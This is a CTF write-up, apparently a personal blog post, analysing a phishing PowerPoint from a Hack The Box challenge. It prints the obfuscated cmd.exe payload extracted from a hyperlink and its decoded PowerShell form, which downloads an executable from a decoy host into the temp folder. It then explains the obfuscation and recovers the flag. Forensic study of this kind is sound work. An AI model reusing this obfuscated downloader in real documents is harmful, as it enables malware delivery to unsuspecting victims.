---
title: "Hack The Box: Alienphish"
date: 2021-04-26T18:20:20-05:00
draft: false
pager: true
authorbox: false
toc: true
categories: ["forensics","writeups","ctf","hackthebox"]
thumbnail: writeups-reports/files/alienphish-thumbnail.PNG
---

This CTF was part of the event hosted at ctf.hackthebox.eu "Cyberapocalypse".
Mission: Find a payload and a flag inside "Alien Weaknesses.pptx",

<!--more-->
---

### Extracting objects from phishing .pptx file

**Using oletools:**

	argandov@Kali:/mnt/c/Users/nitro/Downloads/forensics_alienphish$ oleobj 'Alien Weaknesses.pptx'
	oleobj 0.56.1 - http://decalage.info/oletools
	THIS IS WORK IN PROGRESS - Check updates regularly!
	Please report any issue at https://github.com/decalage2/oletools/issues

	-------------------------------------------------------------------------------
	File: 'Alien Weaknesses.pptx'
	Found relationship 'hyperlink' with external link cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&&for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&&if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
	Found relationship 'hyperlink' with external link cmd.exe

	cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&&for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&&if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22

*We could also unzip the .pptx file and look into each .xml inside it.

## Decoding our strange cmd instruction string

**Using a javascript console:**

	decodeURI("cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&&for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&&if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22")

**result:**

	"cmd.exe /V:ON/C\"set yM=\"o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q' + pmet:vne$ = o$\" c- llehsrewop&&for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%\""

**Making sense of our cmd instruction set:**

I chose to reverse the whole string between the variable "yM" assignment and the start of the "for loop", getting this:

	powershell -c \"$o = $env:temp + 'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o\"

*This can also be done with bash:*

		argandov@Kali:~$ cat cmd_instr.txt | rev

	    *Thanks to @Networkrecon for the tip*

**The instructions then are clear:**

1. ```/V:ON``` -> delayed environment variable expansion
2. ```/C``` -> "Carries out the command specified by string and then stops"

Then stores the reversed instruction into a variable called ```yM```, which will be iterated through, character by character to get a new string, which then will be executed by ```call %kCX:*kCX!=%```.

Our variable "o" consists on the temp directory + a strange looking name for a .exe file, which is the name of the "outfile" used by powershell to get the iwr function: ```iwr http:/destroyearth.alien/x.exe -outfile $o\"``` uses "Invoke web request" or "iwr", reaching out to some remote server, to get a "x.exe" file, and will then try to store it with "-outfile" as our "o" variable.

## Follow your instincts and get the flag!

The fact that "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe" is not reasonable at all, and that the remote http server is called only with one slash "/", calls to our attention that there is something about the name of the .exe itself and that the domain "destroyearth.alien" is only a decoy for this exercise.

After some testing, we decoded the "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99" name of the executable from Base64:

	argandov@Kali:~$ echo Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99 | base64 -d
	CHTB{pH1sHiNg_w0_m4cr0sbase64: invalid input

**And we got our flag!**

There was no reason to think "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe" could be the flag itself, base64 encoded, so I guess this was pure luck!
